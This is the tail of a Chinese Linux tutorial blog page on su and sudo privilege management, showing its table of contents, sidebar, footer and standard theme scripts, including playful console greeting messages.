no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B0%B8%E4%B9%85%E6%8F%90%E6%9D%83"><span class="toc-number">1.</span> <span class="toc-text">永久提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">1.基本语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E4%B8%8E%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.2.</span> <span class="toc-text">2.核心功能与示例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1%E5%88%87%E6%8D%A2%E5%88%B0root%E7%94%A8%E6%88%B7"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.1切换到root用户</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1-1%E5%AE%89%E5%85%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">2.1.1安全注意事项</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E6%9A%B4%E9%9C%B2%E9%A3%8E%E9%99%A9%EF%BC%9A"><span class="toc-number">1.2.1.1.1.</span> <span class="toc-text">密码暴露风险：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%A6%81%E7%94%A8-root%E7%99%BB%E5%BD%95%EF%BC%9A"><span class="toc-number">1.2.1.1.2.</span> <span class="toc-text">禁用 root登录：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1-2%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">2.1.2常见问题解答</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%80%80%E5%87%BAsu%E5%88%87%E6%8D%A2%E7%9A%84%E7%94%A8%E6%88%B7%EF%BC%9F"><span class="toc-number">1.2.1.2.1.</span> <span class="toc-text">如何退出su切换的用户？</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%87%E6%8D%A2%E7%94%A8%E6%88%B7%E5%90%8E%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%94%99%E8%AF%AF%EF%BC%9F"><span class="toc-number">1.2.1.2.2.</span> <span class="toc-text">切换用户后环境变量错误？</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E6%97%A0%E6%B3%95%E5%88%87%E6%8D%A2%E5%88%B0-root%EF%BC%9F"><span class="toc-number">1.2.1.2.3.</span> <span class="toc-text">普通用户无法切换到 root？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2%E5%88%87%E6%8D%A2%E5%88%B0%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.2切换到其他用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3%E6%89%A7%E8%A1%8C%E5%8D%95%E6%9D%A1%E5%91%BD%E4%BB%A4%E5%90%8E%E9%80%80%E5%87%BA"><span class="toc-number">1.2.3.</span> <span class="toc-text">2.3执行单条命令后退出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">1.2.4.</span> <span class="toc-text">2.4 实际应用场景</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E7%BB%B4%E6%8A%A4"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">系统维护</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E4%B8%AD%E4%B8%B4%E6%97%B6%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">脚本中临时提权</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">临时提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%A0%B8%E5%BF%83%E7%89%B9%E6%80%A7"><span class="toc-number">2.1.</span> <span class="toc-text">1.核心特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">2.2.</span> <span class="toc-text">2.基本语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-number">2.3.</span> <span class="toc-text">3.工作流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-etc-sudoers"><span class="toc-number">2.4.</span> <span class="toc-text">4.配置文件 &#x2F;etc&#x2F;sudoers</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1%E9%85%8D%E7%BD%AE%E8%AF%AD%E6%B3%95"><span class="toc-number">2.4.1.</span> <span class="toc-text">4.1配置语法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.4.2.</span> <span class="toc-text">4.2示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3%E5%AE%9E%E9%AA%8C%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.4.3.</span> <span class="toc-text">4.3实验示例</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E4%B8%80%E4%B8%AA%E6%96%B0%E7%94%A8%E6%88%B7user777%E5%85%B7%E6%9C%89%E5%88%A0%E9%99%A4test%E7%94%A8%E6%88%B7%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">2.4.3.1.</span> <span class="toc-text">使一个新用户user777具有删除test用户的权限</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E5%B0%86%E6%96%B0%E7%94%A8%E6%88%B7%E5%8A%A0%E5%85%A5wheel%E7%BB%84"><span class="toc-number">2.4.3.1.1.</span> <span class="toc-text">方法一：将新用户加入wheel组</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E7%BC%96%E8%BE%91-etc-sudoers-%E6%B7%BB%E5%8A%A0%E7%89%B9%E6%9D%83"><span class="toc-number">2.4.3.1.2.</span> <span class="toc-text">方法二：编辑&#x2F;etc&#x2F;sudoers 添加特权</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="toc-number">2.5.</span> <span class="toc-text">5. 实际应用场景：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E6%89%A7%E8%A1%8C%E7%89%B9%E6%9D%83%E5%91%BD%E4%BB%A4"><span class="toc-number">2.5.1.</span> <span class="toc-text">5.1 普通用户执行特权命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-2-%E4%BB%A5%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">2.5.2.</span> <span class="toc-text">5.2 以其他用户身份执行命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-3-%E8%BF%9B%E5%85%A5%E7%89%B9%E6%9D%83Shell%E7%8E%AF%E5%A2%83"><span class="toc-number">2.5.3.</span> <span class="toc-text">5.3 进入特权Shell环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-4-%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-number">2.5.4.</span> <span class="toc-text">5.4 查看用户权限</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%AE%89%E5%85%A8%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5"><span class="toc-number">2.6.</span> <span class="toc-text">6.安全最佳实践</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E6%9C%80%E5%B0%8F%E6%9D%83%E9%99%90%E5%8E%9F%E5%88%99%EF%BC%9A"><span class="toc-number">2.6.1.</span> <span class="toc-text">（1）最小权限原则：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E7%A6%81%E7%94%A8%E5%AF%86%E7%A0%81%EF%BC%88%E8%B0%A8%E6%85%8E%E4%BD%BF%E7%94%A8%EF%BC%89%EF%BC%9A"><span class="toc-number">2.6.2.</span> <span class="toc-text">（2）禁用密码（谨慎使用）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E6%97%A5%E5%BF%97%E7%9B%91%E6%8E%A7%EF%BC%9A"><span class="toc-number">2.6.3.</span> <span class="toc-text">（3）日志监控：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%884%EF%BC%89-%E8%B6%85%E6%97%B6%E9%85%8D%E7%BD%AE%EF%BC%9A"><span class="toc-number">2.6.4.</span> <span class="toc-text">（4） 超时配置：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%885%EF%BC%89%E7%A6%81%E7%94%A8-root-%E7%99%BB%E5%BD%95%EF%BC%9A"><span class="toc-number">2.6.5.</span> <span class="toc-text">（5）禁用 root 登录：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3"><span class="toc-number">2.7.</span> <span class="toc-text">7.常见问题解决</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#7-1-%E7%94%A8%E6%88%B7%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8-sudo"><span class="toc-number">2.7.1.</span> <span class="toc-text">7.1 用户无法使用 sudo</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-2-%E5%91%BD%E4%BB%A4%E8%B7%AF%E5%BE%84%E4%B8%8D%E5%8C%B9%E9%85%8D"><span class="toc-number">2.7.2.</span> <span class="toc-text">7.2 命令路径不匹配</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-3-%E9%81%BF%E5%85%8D%E8%AF%AD%E6%B3%95%E9%94%99%E8%AF%AF"><span class="toc-number">2.7.3.</span> <span class="toc-text">7.3 避免语法错误</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95"><span class="toc-number">2.8.</span> <span class="toc-text">8. 高级用法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#8-1-%E9%99%90%E5%88%B6%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0"><span class="toc-number">2.8.1.</span> <span class="toc-text">8.1 限制命令参数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E6%80%BB%E7%BB%93"><span class="toc-number">2.9.</span> <span class="toc-text">9. 总结</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E5%AF%B9%E6%AF%94%EF%BC%9A-sudo-vs-su"><span class="toc-number">2.9.1.</span> <span class="toc-text">（1）对比： sudo vs su</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E5%8D%B1%E5%AE%B3%E6%AF%94%E8%BE%83%E5%A4%A7%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">2.9.2.</span> <span class="toc-text">（2）危害比较大的命令:</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/29/Centos8%20Apache%E7%9A%84%E6%90%AD%E5%BB%BA/" title="Centos8 Apache的搭建">Centos8 Apache的搭建</a><time datetime="2025-07-29T08:17:51.000Z" title="Created 2025-07-29 16:17:51">2025-07-29</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2025/07/29/linux/" title="linux文件管理与查询">linux文件管理与查询</a><time datetime="2025-07-29T08:17:51.000Z" title="Created 2025-07-29 16:17:51">2025-07-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/29/VIM%E7%BC%96%E8%BE%91%E5%99%A8%E5%92%8C%E7%94%A8%E6%88%B7%E7%BB%84%E7%AE%A1%E7%90%86/" title="VIM编辑器和用户组管理">VIM编辑器和用户组管理</a><time datetime="2025-07-29T08:17:51.000Z" title="Created 2025-07-29 16:17:51">2025-07-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/29/linux%E5%9F%BA%E7%A1%80%E5%A4%A7%E4%BD%9C%E4%B8%9Aw1/" title="linux基础作业w1">linux基础作业w1</a><time datetime="2025-07-29T08:17:51.000Z" title="Created 2025-07-29 16:17:51">2025-07-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/29/%E5%8E%8B%E7%BC%A9%E5%92%8C%E8%A7%A3%E5%8E%8B%E7%BC%A9/" title="压缩和解压缩">压缩和解压缩</a><time datetime="2025-07-29T08:17:51.000Z" title="Created 2025-07-29 16:17:51">2025-07-29</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2025 By <a class="footer-bar-link" href="/" title="John Doe" target="_blank">John Doe</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">Articles</div><div class="length-num">10</div></a><a href="/tags/" title="tag"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/categories/" title="category"><div class="headline">Categories</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">Function</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="Display Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>Display Mode</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/linux/" style="font-size: 0.88rem;">linux<sup>9</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.14",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 John Doe 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>